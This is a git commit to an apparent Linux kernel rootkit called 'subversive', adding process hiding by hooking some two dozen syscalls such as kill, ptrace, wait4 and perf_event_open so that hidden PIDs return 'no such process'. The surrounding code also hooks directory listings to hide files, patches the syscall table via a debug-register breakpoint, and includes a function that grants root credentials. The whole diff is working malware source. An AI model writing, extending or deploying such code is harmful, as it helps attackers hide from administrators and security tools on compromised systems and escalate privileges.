931de7e993ec89be511df2bb1bb58f978d665347
falken <falken@tuxfamily.org>
2011-04-28 17:35:30 +0200

    kernel: implement pid hiding
    We hook every possible functions taking a pid as parameter and
    return ESRCH when pid is hidden.
    Note that the process will still be in ps or top listings. I will
    implement that later.

--- include/subversive/config.h
+++ include/subversive/config.h
@@ -2,5 +2,6 @@
 #define __CONFIG_H
 
 #define MAX_HIDDEN_INODES 1024
+#define MAX_HIDDEN_PIDS   1024
 
 #endif
--- kernel/hook.c
+++ kernel/hook.c
@@ -1,7 +1,9 @@
 #include <linux/kernel.h>
 #include <linux/cred.h>
+#include <linux/perf_event.h>
 #include <asm/ptrace.h>
 #include <asm/unistd.h>
+#include <asm/siginfo.h>
 
 #include <subversive/config.h>
 #include <subversive/arch.h>
@@ -12,7 +14,7 @@
 #define SYSCALL(sys, args...) ((long(*)())sct[__NR_##sys])(args)
 #define HOOK(sys, func) fake_sct[__NR_##sys] = (unsigned long)func
 
-static unsigned long fake_sct[300];
+static unsigned long fake_sct[320];
 static unsigned long *sct;
 
 static int lulz_mode = 0;
@@ -133,6 +135,208 @@ asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return ret;
 }
 
+static int hidden_pids[MAX_HIDDEN_PIDS];
+
+static int is_pid_hidden(int pid)
+{
+	int i;
+
+	for (i = 0; i < MAX_HIDDEN_PIDS; i++)
+		if (hidden_pids[i] == pid)
+			return 1;
+
+	return 0;
+}
+
+static void hide_pid(int pid)
+{
+	int i;
+
+	for (i = 0; i < MAX_HIDDEN_PIDS; i++) {
+		if (!hidden_pids[i] || hidden_pids[i] == pid) {
+			hidden_pids[i] = pid;
+			break;
+		}
+	}
+}
+
+static void unhide_pid(int pid)
+{
+	int i;
+
+	for (i = 0; i < MAX_HIDDEN_PIDS; i++) {
+		if (hidden_pids[i] == pid) {
+			hidden_pids[i] = 0;
+			break;
+		}
+	}
+}
+
+#define RETURN_PID_HIDDEN(pid)						\
+	do {								\
+		if (is_pid_hidden(pid) && SYSCALL(getpid) != pid)	\
+			return -ESRCH;					\
+	} while (0)
+
+asmlinkage long new_sys_getpgid(pid_t pid)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(getpgid, pid);
+}
+
+asmlinkage long new_sys_getsid(pid_t pid)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(getsid, pid);
+}
+
+asmlinkage long new_sys_setpgid(pid_t pid, pid_t pgid)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(setpgid, pid, pgid);
+}
+
+asmlinkage long new_sys_kill(int pid, int sig)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(kill, pid, sig);
+}
+
+asmlinkage long new_sys_tgkill(int tgid, int pid, int sig)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(tgkill, tgid, pid, sig);
+}
+
+asmlinkage long new_sys_tkill(int pid, int sig)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(tkill, pid, sig);
+}
+
+asmlinkage long new_sys_sched_setscheduler(pid_t pid, int policy,
+						struct sched_param *param)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(sched_setscheduler, pid, policy, param);
+}
+
+asmlinkage long new_sys_sched_setparam(pid_t pid, struct sched_param *param)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(sched_setparam, pid, param);
+}
+
+asmlinkage long new_sys_sched_getscheduler(pid_t pid)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(sched_getscheduler, pid);
+}
+
+asmlinkage long new_sys_sched_getparam(pid_t pid, struct sched_param *param)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(sched_getparam, pid, param);
+}
+
+asmlinkage long new_sys_sched_setaffinity(pid_t pid, unsigned int len,
+					unsigned long *user_mask_ptr)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(sched_setaffinity, pid, len, user_mask_ptr);
+}
+
+asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len,
+					unsigned long *user_mask_ptr)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(sched_getaffinity, pid, len, user_mask_ptr);
+}
+
+asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, struct timespec *interval)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(sched_rr_get_interval, pid, interval);
+}
+
+asmlinkage long new_sys_wait4(pid_t pid, int *stat_addr,
+				int options, struct rusage *ru)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(wait4, pid, stat_addr, options, ru);
+}
+
+asmlinkage long new_sys_waitid(int which, pid_t pid,
+				struct siginfo *infop,
+				int options, struct rusage *ru)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(waitid, which, pid, infop, options, ru);
+}
+
+asmlinkage long new_sys_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
+					siginfo_t *uinfo)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(rt_tgsigqueueinfo, tgid, pid, sig, uinfo);
+}
+
+asmlinkage long new_sys_rt_sigqueueinfo(int pid, int sig, siginfo_t *uinfo)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(rt_sigqueueinfo, pid, sig, uinfo);
+}
+
+asmlinkage long new_sys_prlimit64(pid_t pid, unsigned int resource,
+				const struct rlimit64 *new_rlim,
+				struct rlimit64 *old_rlim)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(prlimit64, pid, resource, new_rlim, old_rlim);
+}
+
+asmlinkage long new_sys_ptrace(long request, long pid, unsigned long addr,
+				unsigned long data)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(ptrace, request, pid, addr, data);
+}
+
+asmlinkage long new_sys_migrate_pages(pid_t pid, unsigned long maxnode,
+					const unsigned long *from,
+					const unsigned long *to)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(migrate_pages, pid, maxnode, from, to);
+}
+
+asmlinkage long new_sys_move_pages(pid_t pid, unsigned long nr_pages,
+				const void **pages,
+				const int *nodes,
+				int *status,
+				int flags)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(move_pages, nr_pages, pages, nodes, status, flags);
+}
+
+asmlinkage long new_sys_get_robust_list(int pid,
+					struct robust_list_head **head_ptr,
+					size_t *len_ptr)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(get_robust_list, pid, head_ptr, len_ptr);
+}
+
+asmlinkage long new_sys_perf_event_open(
+                struct perf_event_attr *attr_uptr,
+                pid_t pid, int cpu, int group_fd, unsigned long flags)
+{
+	RETURN_PID_HIDDEN(pid);
+	return SYSCALL(perf_event_open, attr_uptr, pid, cpu, group_fd, flags);
+}
+
+
 static inline void give_root_creds(void)
 {
 	commit_creds(prepare_kernel_cred(NULL));
@@ -176,6 +380,7 @@ void system_call_hook(struct pt_regs *regs)
 int hook_sys_call_table(void)
 {
 	memset(hidden_inodes, 0, ARRAY_SIZE(hidden_inodes));
+	memset(hidden_pids, 0, ARRAY_SIZE(hidden_pids));
 
 	find_sys_call_table();
 	sct = (unsigned long *)sys_call_table;
@@ -188,6 +393,31 @@ int hook_sys_call_table(void)
 	HOOK(write, new_sys_write);
 	HOOK(getdents, new_sys_getdents);
 	HOOK(getdents64, new_sys_getdents64);
+
+	HOOK(getpgid, new_sys_getpgid);
+	HOOK(getsid, new_sys_getsid);
+	HOOK(setpgid, new_sys_setpgid);
+	HOOK(kill, new_sys_kill);
+	HOOK(tgkill, new_sys_tgkill);
+	HOOK(tkill, new_sys_tkill);
+	HOOK(sched_setscheduler, new_sys_sched_setscheduler);
+	HOOK(sched_setparam, new_sys_sched_setparam);
+	HOOK(sched_getscheduler, new_sys_sched_getscheduler);
+	HOOK(sched_getparam, new_sys_sched_getparam);
+	HOOK(sched_setaffinity, new_sys_sched_setaffinity);
+	HOOK(sched_getaffinity, new_sys_sched_getaffinity);
+	HOOK(sched_rr_get_interval, new_sys_sched_rr_get_interval);
+	HOOK(wait4, new_sys_wait4);
+	HOOK(waitid, new_sys_waitid);
+	HOOK(rt_tgsigqueueinfo, new_sys_rt_tgsigqueueinfo);
+	HOOK(rt_sigqueueinfo, new_sys_rt_sigqueueinfo);
+	HOOK(prlimit64, new_sys_prlimit64);
+	HOOK(ptrace, new_sys_ptrace);
+	HOOK(migrate_pages, new_sys_migrate_pages);
+	HOOK(move_pages, new_sys_move_pages);
+	HOOK(get_robust_list, new_sys_get_robust_list);
+	HOOK(perf_event_open, new_sys_perf_event_open);
+
 
 	register_dr_breakpoint(sys_call_table_call, DR_RW_EXECUTE, 0,
 				system_call_hook);
